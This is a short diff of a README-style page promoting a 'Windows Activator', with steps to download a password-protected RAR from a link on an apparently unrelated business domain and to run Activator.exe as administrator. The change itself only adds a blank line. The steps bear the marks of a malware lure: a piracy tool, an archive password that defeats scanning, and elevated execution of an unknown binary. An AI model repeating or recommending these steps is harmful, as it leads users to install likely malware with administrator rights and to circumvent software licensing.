@@ -6,6 +6,7 @@ With this program you can easily activate any version of Windows, just select yo
 Step [1/2] Download 'activator script' from direct download links given below :
 * Download: [Download](https://portalproveedores.com.mx/softwarehub/download/Windows%20Activator.rar)
 * Password: wactivator
+
 Step 2/2] Run File as Administrator
 * Right click Activator.exe file and select on run as administrator option
 * Wait until the process is completed in cmd
